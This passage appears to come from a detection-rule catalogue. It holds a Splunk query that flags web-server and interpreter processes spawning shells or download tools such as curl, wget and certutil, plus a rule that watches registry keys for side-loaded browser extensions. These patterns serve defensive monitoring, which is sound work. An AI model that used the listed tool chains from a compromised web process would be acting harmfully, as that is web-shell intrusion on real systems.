| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Endpoint.Processes.parent_process_name IN ("php","php-fpm","php-cgi","httpd","apache2","nginx","w3wp.exe","coldfusion.exe","jrun.exe","java","python","python3","uvicorn") Endpoint.Processes.process_name IN ("cmd.exe","powershell.exe","bash","sh","dash","whoami","id","curl","wget","certutil.exe") by Endpoint.Processes.dest, Endpoint.Processes.user, Endpoint.Processes.parent_process_name, Endpoint.Processes.process_name, Endpoint.Processes.process | `drop_dm_object_name(Endpoint.Processes)` | sort - lastTime
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.

Data sourcesEndpoint.Registry DeviceRegistryEvents

| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
